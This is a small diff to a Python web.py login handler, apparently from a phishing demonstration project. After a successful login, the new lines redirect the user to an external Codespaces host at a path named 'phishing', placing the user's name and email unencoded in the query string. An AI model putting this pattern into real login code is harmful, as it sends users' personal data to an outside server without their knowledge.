@@ -37,5 +37,6 @@ class IniciarSesion:
                         break
 
         if inicio_usuario:
-            session.logged_user = inicio_usuario  # Guarda los datos en la sesión
-            raise web.seeother("/phishing")
+            # Construir la URL con los datos
+            url = "https://solid-system-jjrj6wgpx9xj35549-8080.app.github.dev/usuarioContenido/phishing?nombre=" + inicio_usuario["nombre"] + "&correo=" + inicio_usuario["correo"]
+            raise web.seeother(url)
